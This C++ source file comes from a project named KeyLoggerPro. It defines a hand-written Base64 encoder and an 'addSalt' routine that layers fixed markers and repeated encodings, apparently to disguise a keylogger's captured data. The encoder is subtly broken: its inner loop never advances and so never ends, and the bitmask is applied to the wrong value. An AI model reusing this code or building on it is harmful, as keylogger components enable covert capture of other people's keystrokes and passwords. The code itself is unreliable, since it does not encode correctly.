/**
  * Encoding.cpp
  *
  * @author Raul Butuc
  * @version 1.0.0 - 27/07/2016
  */

#include "stdafx.h"
#include "Encoding.h"

namespace KeyLoggerPro {

  std::string Encoding::encodeB64(const std::string &_str) {
    std::string res;
    int val = 0;
    int bts = -6;
    int step = 8;

    const unsigned int b63 = 0x3F;

    for (const auto &chr : _str) {
      val = (val << step) + chr;
      bts += step;

      while (bts >= 0) {
        res.push_back(_B64__CD.at(val >> bts) & b63);
      }
    }

    if (bts > -6) {
      res.push_back(_B64__CD.at((val << step) >> (bts + step)) & b63);
    }

    while (res.size() % 4) {
      res.push_back('=');
    }

    return res;
  }

  std::string Encoding::addSalt(const std::string &_str) {
    std::string res = encodeB64(_ENCY__St + _str + _ENCY__Nd + _ENCY__Rd);
    res.insert(7, _ENCY__Rd).append(_ENCY__St);
    res = encodeB64(res).append(_ENCY__Nd).append(_ENCY__Rd).append(_ENCY__St);;
    res = encodeB64(res).insert(1, "6").insert(7, "X");

    return res;
  }

}
